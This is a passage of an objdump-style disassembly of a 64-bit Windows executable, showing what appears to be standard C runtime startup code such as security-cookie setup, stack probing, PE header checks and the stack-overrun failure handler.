   140006d72:	32 c0                	xor    %al,%al
   140006d74:	48 83 c4 28          	add    $0x28,%rsp
   140006d78:	c3                   	ret
   140006d79:	b0 01                	mov    $0x1,%al
   140006d7b:	eb f7                	jmp    0x140006d74
   140006d7d:	cc                   	int3
   140006d7e:	cc                   	int3
   140006d7f:	cc                   	int3
   140006d80:	48 83 ec 28          	sub    $0x28,%rsp
   140006d84:	85 c9                	test   %ecx,%ecx
   140006d86:	75 07                	jne    0x140006d8f
   140006d88:	c6 05 11 66 00 00 01 	movb   $0x1,0x6611(%rip)        # 0x14000d3a0
   140006d8f:	e8 18 08 00 00       	call   0x1400075ac
   140006d94:	e8 f3 04 00 00       	call   0x14000728c
   140006d99:	84 c0                	test   %al,%al
   140006d9b:	75 04                	jne    0x140006da1
   140006d9d:	32 c0                	xor    %al,%al
   140006d9f:	eb 14                	jmp    0x140006db5
   140006da1:	e8 e6 04 00 00       	call   0x14000728c
   140006da6:	84 c0                	test   %al,%al
   140006da8:	75 09                	jne    0x140006db3
   140006daa:	33 c9                	xor    %ecx,%ecx
   140006dac:	e8 db 04 00 00       	call   0x14000728c
   140006db1:	eb ea                	jmp    0x140006d9d
   140006db3:	b0 01                	mov    $0x1,%al
   140006db5:	48 83 c4 28          	add    $0x28,%rsp
   140006db9:	c3                   	ret
   140006dba:	cc                   	int3
   140006dbb:	cc                   	int3
   140006dbc:	40 53                	rex push %rbx
   140006dbe:	48 83 ec 20          	sub    $0x20,%rsp
   140006dc2:	80 3d d8 65 00 00 00 	cmpb   $0x0,0x65d8(%rip)        # 0x14000d3a1
   140006dc9:	8b d9                	mov    %ecx,%ebx
   140006dcb:	75 67                	jne    0x140006e34
   140006dcd:	83 f9 01             	cmp    $0x1,%ecx
   140006dd0:	77 6a                	ja     0x140006e3c
   140006dd2:	e8 6d 0a 00 00       	call   0x140007844
   140006dd7:	85 c0                	test   %eax,%eax
   140006dd9:	74 28                	je     0x140006e03
   140006ddb:	85 db                	test   %ebx,%ebx
   140006ddd:	75 24                	jne    0x140006e03
   140006ddf:	48 8d 0d c2 65 00 00 	lea    0x65c2(%rip),%rcx        # 0x14000d3a8
   140006de6:	e8 8d 0b 00 00       	call   0x140007978
   140006deb:	85 c0                	test   %eax,%eax
   140006ded:	75 10                	jne    0x140006dff
   140006def:	48 8d 0d ca 65 00 00 	lea    0x65ca(%rip),%rcx        # 0x14000d3c0
   140006df6:	e8 7d 0b 00 00       	call   0x140007978
   140006dfb:	85 c0                	test   %eax,%eax
   140006dfd:	74 2e                	je     0x140006e2d
   140006dff:	32 c0                	xor    %al,%al
   140006e01:	eb 33                	jmp    0x140006e36
   140006e03:	66 0f 6f 05 25 19 00 	movdqa 0x1925(%rip),%xmm0        # 0x140008730
   140006e0a:	00 
   140006e0b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140006e0f:	f3 0f 7f 05 91 65 00 	movdqu %xmm0,0x6591(%rip)        # 0x14000d3a8
   140006e16:	00 
   140006e17:	48 89 05 9a 65 00 00 	mov    %rax,0x659a(%rip)        # 0x14000d3b8
   140006e1e:	f3 0f 7f 05 9a 65 00 	movdqu %xmm0,0x659a(%rip)        # 0x14000d3c0
   140006e25:	00 
   140006e26:	48 89 05 a3 65 00 00 	mov    %rax,0x65a3(%rip)        # 0x14000d3d0
   140006e2d:	c6 05 6d 65 00 00 01 	movb   $0x1,0x656d(%rip)        # 0x14000d3a1
   140006e34:	b0 01                	mov    $0x1,%al
   140006e36:	48 83 c4 20          	add    $0x20,%rsp
   140006e3a:	5b                   	pop    %rbx
   140006e3b:	c3                   	ret
   140006e3c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140006e41:	e8 96 04 00 00       	call   0x1400072dc
   140006e46:	cc                   	int3
   140006e47:	cc                   	int3
   140006e48:	48 83 ec 18          	sub    $0x18,%rsp
   140006e4c:	4c 8b c1             	mov    %rcx,%r8
   140006e4f:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140006e54:	66 39 05 a5 91 ff ff 	cmp    %ax,-0x6e5b(%rip)        # 0x140000000
   140006e5b:	75 78                	jne    0x140006ed5
   140006e5d:	48 63 0d d8 91 ff ff 	movslq -0x6e28(%rip),%rcx        # 0x14000003c
   140006e64:	48 8d 15 95 91 ff ff 	lea    -0x6e6b(%rip),%rdx        # 0x140000000
   140006e6b:	48 03 ca             	add    %rdx,%rcx
   140006e6e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140006e74:	75 5f                	jne    0x140006ed5
   140006e76:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140006e7b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140006e7f:	75 54                	jne    0x140006ed5
   140006e81:	4c 2b c2             	sub    %rdx,%r8
   140006e84:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140006e88:	48 83 c2 18          	add    $0x18,%rdx
   140006e8c:	48 03 d1             	add    %rcx,%rdx
   140006e8f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140006e93:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140006e97:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140006e9b:	48 89 14 24          	mov    %rdx,(%rsp)
   140006e9f:	49 3b d1             	cmp    %r9,%rdx
   140006ea2:	74 18                	je     0x140006ebc
   140006ea4:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140006ea7:	4c 3b c1             	cmp    %rcx,%r8
   140006eaa:	72 0a                	jb     0x140006eb6
   140006eac:	8b 42 08             	mov    0x8(%rdx),%eax
   140006eaf:	03 c1                	add    %ecx,%eax
   140006eb1:	4c 3b c0             	cmp    %rax,%r8
   140006eb4:	72 08                	jb     0x140006ebe
   140006eb6:	48 83 c2 28          	add    $0x28,%rdx
   140006eba:	eb df                	jmp    0x140006e9b
   140006ebc:	33 d2                	xor    %edx,%edx
   140006ebe:	48 85 d2             	test   %rdx,%rdx
   140006ec1:	75 04                	jne    0x140006ec7
   140006ec3:	32 c0                	xor    %al,%al
   140006ec5:	eb 14                	jmp    0x140006edb
   140006ec7:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140006ecb:	7d 04                	jge    0x140006ed1
   140006ecd:	32 c0                	xor    %al,%al
   140006ecf:	eb 0a                	jmp    0x140006edb
   140006ed1:	b0 01                	mov    $0x1,%al
   140006ed3:	eb 06                	jmp    0x140006edb
   140006ed5:	32 c0                	xor    %al,%al
   140006ed7:	eb 02                	jmp    0x140006edb
   140006ed9:	32 c0                	xor    %al,%al
   140006edb:	48 83 c4 18          	add    $0x18,%rsp
   140006edf:	c3                   	ret
   140006ee0:	40 53                	rex push %rbx
   140006ee2:	48 83 ec 20          	sub    $0x20,%rsp
   140006ee6:	8a d9                	mov    %cl,%bl
   140006ee8:	e8 57 09 00 00       	call   0x140007844
   140006eed:	33 d2                	xor    %edx,%edx
   140006eef:	85 c0                	test   %eax,%eax
   140006ef1:	74 0b                	je     0x140006efe
   140006ef3:	84 db                	test   %bl,%bl
   140006ef5:	75 07                	jne    0x140006efe
   140006ef7:	48 87 15 9a 64 00 00 	xchg   %rdx,0x649a(%rip)        # 0x14000d398
   140006efe:	48 83 c4 20          	add    $0x20,%rsp
   140006f02:	5b                   	pop    %rbx
   140006f03:	c3                   	ret
   140006f04:	40 53                	rex push %rbx
   140006f06:	48 83 ec 20          	sub    $0x20,%rsp
   140006f0a:	80 3d 8f 64 00 00 00 	cmpb   $0x0,0x648f(%rip)        # 0x14000d3a0
   140006f11:	8a d9                	mov    %cl,%bl
   140006f13:	74 04                	je     0x140006f19
   140006f15:	84 d2                	test   %dl,%dl
   140006f17:	75 0c                	jne    0x140006f25
   140006f19:	e8 6e 03 00 00       	call   0x14000728c
   140006f1e:	8a cb                	mov    %bl,%cl
   140006f20:	e8 67 03 00 00       	call   0x14000728c
   140006f25:	b0 01                	mov    $0x1,%al
   140006f27:	48 83 c4 20          	add    $0x20,%rsp
   140006f2b:	5b                   	pop    %rbx
   140006f2c:	c3                   	ret
   140006f2d:	cc                   	int3
   140006f2e:	cc                   	int3
   140006f2f:	cc                   	int3
   140006f30:	40 53                	rex push %rbx
   140006f32:	48 83 ec 20          	sub    $0x20,%rsp
   140006f36:	48 83 3d 6a 64 00 00 	cmpq   $0xffffffffffffffff,0x646a(%rip)        # 0x14000d3a8
   140006f3d:	ff 
   140006f3e:	48 8b d9             	mov    %rcx,%rbx
   140006f41:	75 07                	jne    0x140006f4a
   140006f43:	e8 3c 0a 00 00       	call   0x140007984
   140006f48:	eb 0f                	jmp    0x140006f59
   140006f4a:	48 8b d3             	mov    %rbx,%rdx
   140006f4d:	48 8d 0d 54 64 00 00 	lea    0x6454(%rip),%rcx        # 0x14000d3a8
   140006f54:	e8 25 0a 00 00       	call   0x14000797e
   140006f59:	33 d2                	xor    %edx,%edx
   140006f5b:	85 c0                	test   %eax,%eax
   140006f5d:	48 0f 44 d3          	cmove  %rbx,%rdx
   140006f61:	48 8b c2             	mov    %rdx,%rax
   140006f64:	48 83 c4 20          	add    $0x20,%rsp
   140006f68:	5b                   	pop    %rbx
   140006f69:	c3                   	ret
   140006f6a:	cc                   	int3
   140006f6b:	cc                   	int3
   140006f6c:	48 83 ec 28          	sub    $0x28,%rsp
   140006f70:	e8 bb ff ff ff       	call   0x140006f30
   140006f75:	48 f7 d8             	neg    %rax
   140006f78:	1b c0                	sbb    %eax,%eax
   140006f7a:	f7 d8                	neg    %eax
   140006f7c:	ff c8                	dec    %eax
   140006f7e:	48 83 c4 28          	add    $0x28,%rsp
   140006f82:	c3                   	ret
   140006f83:	cc                   	int3
   140006f84:	c2 00 00             	ret    $0x0
   140006f87:	cc                   	int3
   140006f88:	cc                   	int3
   140006f89:	cc                   	int3
   140006f8a:	cc                   	int3
   140006f8b:	cc                   	int3
   140006f8c:	cc                   	int3
   140006f8d:	cc                   	int3
   140006f8e:	cc                   	int3
   140006f8f:	cc                   	int3
   140006f90:	cc                   	int3
   140006f91:	cc                   	int3
   140006f92:	cc                   	int3
   140006f93:	cc                   	int3
   140006f94:	cc                   	int3
   140006f95:	cc                   	int3
   140006f96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006f9d:	00 00 00 
   140006fa0:	48 83 ec 10          	sub    $0x10,%rsp
   140006fa4:	4c 89 14 24          	mov    %r10,(%rsp)
   140006fa8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   140006fad:	4d 33 db             	xor    %r11,%r11
   140006fb0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   140006fb5:	4c 2b d0             	sub    %rax,%r10
   140006fb8:	4d 0f 42 d3          	cmovb  %r11,%r10
   140006fbc:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   140006fc3:	00 00 
   140006fc5:	4d 3b d3             	cmp    %r11,%r10
   140006fc8:	73 16                	jae    0x140006fe0
   140006fca:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   140006fd0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   140006fd7:	41 c6 03 00          	movb   $0x0,(%r11)
   140006fdb:	4d 3b d3             	cmp    %r11,%r10
   140006fde:	75 f0                	jne    0x140006fd0
   140006fe0:	4c 8b 14 24          	mov    (%rsp),%r10
   140006fe4:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   140006fe9:	48 83 c4 10          	add    $0x10,%rsp
   140006fed:	c3                   	ret
   140006fee:	cc                   	int3
   140006fef:	cc                   	int3
   140006ff0:	40 53                	rex push %rbx
   140006ff2:	48 83 ec 20          	sub    $0x20,%rsp
   140006ff6:	48 8b d9             	mov    %rcx,%rbx
   140006ff9:	33 c9                	xor    %ecx,%ecx
   140006ffb:	ff 15 d7 10 00 00    	call   *0x10d7(%rip)        # 0x1400080d8
   140007001:	48 8b cb             	mov    %rbx,%rcx
   140007004:	ff 15 d6 10 00 00    	call   *0x10d6(%rip)        # 0x1400080e0
   14000700a:	ff 15 50 11 00 00    	call   *0x1150(%rip)        # 0x140008160
   140007010:	48 8b c8             	mov    %rax,%rcx
   140007013:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140007018:	48 83 c4 20          	add    $0x20,%rsp
   14000701c:	5b                   	pop    %rbx
   14000701d:	48 ff 25 34 11 00 00 	rex.W jmp *0x1134(%rip)        # 0x140008158
   140007024:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140007029:	48 83 ec 38          	sub    $0x38,%rsp
   14000702d:	b9 17 00 00 00       	mov    $0x17,%ecx
   140007032:	ff 15 90 10 00 00    	call   *0x1090(%rip)        # 0x1400080c8
   140007038:	85 c0                	test   %eax,%eax
   14000703a:	74 07                	je     0x140007043
   14000703c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140007041:	cd 29                	int    $0x29
   140007043:	48 8d 0d 36 64 00 00 	lea    0x6436(%rip),%rcx        # 0x14000d480
   14000704a:	e8 a9 00 00 00       	call   0x1400070f8
   14000704f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140007054:	48 89 05 1d 65 00 00 	mov    %rax,0x651d(%rip)        # 0x14000d578
   14000705b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140007060:	48 83 c0 08          	add    $0x8,%rax
   140007064:	48 89 05 ad 64 00 00 	mov    %rax,0x64ad(%rip)        # 0x14000d518
   14000706b:	48 8b 05 06 65 00 00 	mov    0x6506(%rip),%rax        # 0x14000d578
   140007072:	48 89 05 77 63 00 00 	mov    %rax,0x6377(%rip)        # 0x14000d3f0
   140007079:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000707e:	48 89 05 7b 64 00 00 	mov    %rax,0x647b(%rip)        # 0x14000d500
   140007085:	c7 05 51 63 00 00 09 	movl   $0xc0000409,0x6351(%rip)        # 0x14000d3e0
   14000708c:	04 00 c0 
   14000708f:	c7 05 4b 63 00 00 01 	movl   $0x1,0x634b(%rip)        # 0x14000d3e4
   140007096:	00 00 00 
   140007099:	c7 05 55 63 00 00 01 	movl   $0x1,0x6355(%rip)        # 0x14000d3f8
   1400070a0:	00 00 00 
   1400070a3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400070a8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400070ac:	48 8d 0d 4d 63 00 00 	lea    0x634d(%rip),%rcx        # 0x14000d400
   1400070b3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400070ba:	00 
   1400070bb:	b8 08 00 00 00       	mov    $0x8,%eax
   1400070c0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400070c4:	48 8b 0d 75 5f 00 00 	mov    0x5f75(%rip),%rcx        # 0x14000d040
   1400070cb:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400070d0:	b8 08 00 00 00       	mov    $0x8,%eax
   1400070d5:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400070d9:	48 8b 0d a0 5f 00 00 	mov    0x5fa0(%rip),%rcx        # 0x14000d080
   1400070e0:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400070e5:	48 8d 0d 54 16 00 00 	lea    0x1654(%rip),%rcx        # 0x140008740
   1400070ec:	e8 ff fe ff ff       	call   0x140006ff0
   1400070f1:	90                   	nop
   1400070f2:	48 83 c4 38          	add    $0x38,%rsp
   1400070f6:	c3                   	ret
   1400070f7:	cc                   	int3
   1400070f8:	40 53                	rex push %rbx
   1400070fa:	56                   	push   %rsi
   1400070fb:	57                   	push   %rdi
   1400070fc:	48 83 ec 40          	sub    $0x40,%rsp
   140007100:	48 8b d9             	mov    %rcx,%rbx
   140007103:	ff 15 ef 0f 00 00    	call   *0xfef(%rip)        # 0x1400080f8
   140007109:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140007110:	33 ff                	xor    %edi,%edi
   140007112:	45 33 c0             	xor    %r8d,%r8d
   140007115:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000711a:	48 8b ce             	mov    %rsi,%rcx
   14000711d:	ff 15 cd 0f 00 00    	call   *0xfcd(%rip)        # 0x1400080f0
   140007123:	48 85 c0             	test   %rax,%rax
   140007126:	74 3c                	je     0x140007164
   140007128:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000712d:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140007132:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140007139:	00 00 
   14000713b:	4c 8b c8             	mov    %rax,%r9
   14000713e:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007143:	4c 8b c6             	mov    %rsi,%r8
   140007146:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000714b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140007150:	33 c9                	xor    %ecx,%ecx
   140007152:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007157:	ff 15 db 0f 00 00    	call   *0xfdb(%rip)        # 0x140008138
   14000715d:	ff c7                	inc    %edi
   14000715f:	83 ff 02             	cmp    $0x2,%edi
   140007162:	7c ae                	jl     0x140007112
   140007164:	48 83 c4 40          	add    $0x40,%rsp
   140007168:	5f                   	pop    %rdi
   140007169:	5e                   	pop    %rsi
   14000716a:	5b                   	pop    %rbx
   14000716b:	c3                   	ret
   14000716c:	e9 8f 07 00 00       	jmp    0x140007900
   140007171:	cc                   	int3
   140007172:	cc                   	int3
   140007173:	cc                   	int3
   140007174:	48 8d 05 05 16 00 00 	lea    0x1605(%rip),%rax        # 0x140008780
   14000717b:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140007182:	00 
   140007183:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140007187:	48 8d 05 e2 15 00 00 	lea    0x15e2(%rip),%rax        # 0x140008770
   14000718e:	48 89 01             	mov    %rax,(%rcx)
   140007191:	48 8b c1             	mov    %rcx,%rax
   140007194:	c3                   	ret
   140007195:	cc                   	int3
   140007196:	cc                   	int3
   140007197:	cc                   	int3
   140007198:	48 83 ec 48          	sub    $0x48,%rsp
   14000719c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400071a1:	e8 ce ff ff ff       	call   0x140007174
   1400071a6:	48 8d 15 9b 37 00 00 	lea    0x379b(%rip),%rdx        # 0x14000a948
   1400071ad:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400071b2:	e8 25 07 00 00       	call   0x1400078dc
   1400071b7:	cc                   	int3
   1400071b8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400071bd:	55                   	push   %rbp
   1400071be:	48 8b ec             	mov    %rsp,%rbp
   1400071c1:	48 83 ec 30          	sub    $0x30,%rsp
   1400071c5:	48 8b 05 74 5e 00 00 	mov    0x5e74(%rip),%rax        # 0x14000d040
   1400071cc:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1400071d3:	2b 00 00 
   1400071d6:	48 3b c3             	cmp    %rbx,%rax
   1400071d9:	75 77                	jne    0x140007252
   1400071db:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400071df:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   1400071e6:	00 
   1400071e7:	ff 15 c3 0e 00 00    	call   *0xec3(%rip)        # 0x1400080b0
   1400071ed:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400071f1:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400071f5:	ff 15 05 0f 00 00    	call   *0xf05(%rip)        # 0x140008100
   1400071fb:	8b c0                	mov    %eax,%eax
   1400071fd:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140007201:	ff 15 b1 0e 00 00    	call   *0xeb1(%rip)        # 0x1400080b8
   140007207:	8b c0                	mov    %eax,%eax
   140007209:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000720d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140007211:	ff 15 a9 0e 00 00    	call   *0xea9(%rip)        # 0x1400080c0
   140007217:	8b 45 18             	mov    0x18(%rbp),%eax
   14000721a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000721e:	48 c1 e0 20          	shl    $0x20,%rax
   140007222:	48 33 45 18          	xor    0x18(%rbp),%rax
   140007226:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   14000722a:	48 33 c1             	xor    %rcx,%rax
   14000722d:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140007234:	ff 00 00 
   140007237:	48 23 c1             	and    %rcx,%rax
   14000723a:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140007241:	2b 00 00 
   140007244:	48 3b c3             	cmp    %rbx,%rax
   140007247:	48 0f 44 c1          	cmove  %rcx,%rax
   14000724b:	48 89 05 ee 5d 00 00 	mov    %rax,0x5dee(%rip)        # 0x14000d040
   140007252:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007257:	48 f7 d0             	not    %rax
   14000725a:	48 89 05 1f 5e 00 00 	mov    %rax,0x5e1f(%rip)        # 0x14000d080
   140007261:	48 83 c4 30          	add    $0x30,%rsp
   140007265:	5d                   	pop    %rbp
   140007266:	c3                   	ret
   140007267:	cc                   	int3
   140007268:	33 c0                	xor    %eax,%eax
   14000726a:	c3                   	ret
   14000726b:	cc                   	int3
   14000726c:	b8 01 00 00 00       	mov    $0x1,%eax
   140007271:	c3                   	ret
   140007272:	cc                   	int3
   140007273:	cc                   	int3
   140007274:	b8 00 40 00 00       	mov    $0x4000,%eax
   140007279:	c3                   	ret
   14000727a:	cc                   	int3
   14000727b:	cc                   	int3
   14000727c:	48 8d 0d cd 66 00 00 	lea    0x66cd(%rip),%rcx        # 0x14000d950
   140007283:	48 ff 25 1e 0e 00 00 	rex.W jmp *0xe1e(%rip)        # 0x1400080a8
   14000728a:	cc                   	int3
   14000728b:	cc                   	int3
   14000728c:	b0 01                	mov    $0x1,%al
   14000728e:	c3                   	ret
   14000728f:	cc                   	int3
   140007290:	48 8d 05 c9 66 00 00 	lea    0x66c9(%rip),%rax        # 0x14000d960
   140007297:	c3                   	ret
   140007298:	48 83 ec 28          	sub    $0x28,%rsp
   14000729c:	e8 6f 9d ff ff       	call   0x140001010
   1400072a1:	48 83 08 24          	orq    $0x24,(%rax)
   1400072a5:	e8 e6 ff ff ff       	call   0x140007290
   1400072aa:	48 83 08 02          	orq    $0x2,(%rax)
   1400072ae:	48 83 c4 28          	add    $0x28,%rsp
   1400072b2:	c3                   	ret
   1400072b3:	cc                   	int3
   1400072b4:	33 c0                	xor    %eax,%eax
   1400072b6:	39 05 d0 5d 00 00    	cmp    %eax,0x5dd0(%rip)        # 0x14000d08c
   1400072bc:	0f 94 c0             	sete   %al
   1400072bf:	c3                   	ret
   1400072c0:	48 8d 05 d1 66 00 00 	lea    0x66d1(%rip),%rax        # 0x14000d998
   1400072c7:	c3                   	ret
   1400072c8:	48 8d 05 c1 66 00 00 	lea    0x66c1(%rip),%rax        # 0x14000d990
   1400072cf:	c3                   	ret
   1400072d0:	c7 05 8e 66 00 00 00 	movl   $0x0,0x668e(%rip)        # 0x14000d968
   1400072d7:	00 00 00 
   1400072da:	c3                   	ret
   1400072db:	cc                   	int3
   1400072dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400072e1:	55                   	push   %rbp
   1400072e2:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   1400072e9:	ff 
   1400072ea:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1400072f1:	8b d9                	mov    %ecx,%ebx
   1400072f3:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400072f8:	ff 15 ca 0d 00 00    	call   *0xdca(%rip)        # 0x1400080c8
   1400072fe:	85 c0                	test   %eax,%eax
   140007300:	74 04                	je     0x140007306
   140007302:	8b cb                	mov    %ebx,%ecx
   140007304:	cd 29                	int    $0x29
   140007306:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000730b:	e8 c0 ff ff ff       	call   0x1400072d0
   140007310:	33 d2                	xor    %edx,%edx
   140007312:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140007316:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   14000731c:	e8 c1 05 00 00       	call   0x1400078e2
   140007321:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140007325:	ff 15 cd 0d 00 00    	call   *0xdcd(%rip)        # 0x1400080f8
   14000732b:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140007332:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140007339:	48 8b cb             	mov    %rbx,%rcx
   14000733c:	45 33 c0             	xor    %r8d,%r8d
   14000733f:	ff 15 ab 0d 00 00    	call   *0xdab(%rip)        # 0x1400080f0
   140007345:	48 85 c0             	test   %rax,%rax
   140007348:	74 3f                	je     0x140007389
   14000734a:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140007351:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140007358:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000735f:	00 00 
   140007361:	4c 8b c8             	mov    %rax,%r9
   140007364:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007369:	4c 8b c3             	mov    %rbx,%r8
   14000736c:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140007373:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140007378:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000737c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140007381:	33 c9                	xor    %ecx,%ecx
   140007383:	ff 15 af 0d 00 00    	call   *0xdaf(%rip)        # 0x140008138
   140007389:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140007390:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007395:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   14000739c:	33 d2                	xor    %edx,%edx
   14000739e:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1400073a5:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400073ab:	48 83 c0 08          	add    $0x8,%rax
   1400073af:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1400073b6:	e8 27 05 00 00       	call   0x1400078e2
   1400073bb:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400073c2:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400073c7:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1400073ce:	40 
   1400073cf:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1400073d6:	00 
   1400073d7:	ff 15 c3 0c 00 00    	call   *0xcc3(%rip)        # 0x1400080a0
   1400073dd:	8b d8                	mov    %eax,%ebx
   1400073df:	33 c9                	xor    %ecx,%ecx
   1400073e1:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400073e6:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400073eb:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400073ef:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400073f4:	ff 15 de 0c 00 00    	call   *0xcde(%rip)        # 0x1400080d8
   1400073fa:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400073ff:	ff 15 db 0c 00 00    	call   *0xcdb(%rip)        # 0x1400080e0
   140007405:	85 c0                	test   %eax,%eax
   140007407:	75 0d                	jne    0x140007416
   140007409:	83 fb 01             	cmp    $0x1,%ebx
   14000740c:	74 08                	je     0x140007416
   14000740e:	8d 48 03             	lea    0x3(%rax),%ecx
   140007411:	e8 ba fe ff ff       	call   0x1400072d0
   140007416:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000741d:	00 
   14000741e:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140007425:	5d                   	pop    %rbp
   140007426:	c3                   	ret
   140007427:	cc                   	int3
   140007428:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000742f:	33 d2                	xor    %edx,%edx
   140007431:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007436:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   14000743a:	e8 a3 04 00 00       	call   0x1400078e2
   14000743f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007444:	ff 15 4e 0c 00 00    	call   *0xc4e(%rip)        # 0x140008098
   14000744a:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   14000744f:	b8 0a 00 00 00       	mov    $0xa,%eax
   140007454:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   14000745a:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140007461:	c3                   	ret
   140007462:	cc                   	int3
   140007463:	cc                   	int3
   140007464:	e9 ff fd ff ff       	jmp    0x140007268
   140007469:	cc                   	int3
   14000746a:	cc                   	int3
   14000746b:	cc                   	int3
   14000746c:	48 83 ec 28          	sub    $0x28,%rsp
   140007470:	33 c9                	xor    %ecx,%ecx
   140007472:	ff 15 18 0c 00 00    	call   *0xc18(%rip)        # 0x140008090
   140007478:	48 85 c0             	test   %rax,%rax
   14000747b:	74 3a                	je     0x1400074b7
   14000747d:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140007482:	66 39 08             	cmp    %cx,(%rax)
   140007485:	75 30                	jne    0x1400074b7
   140007487:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
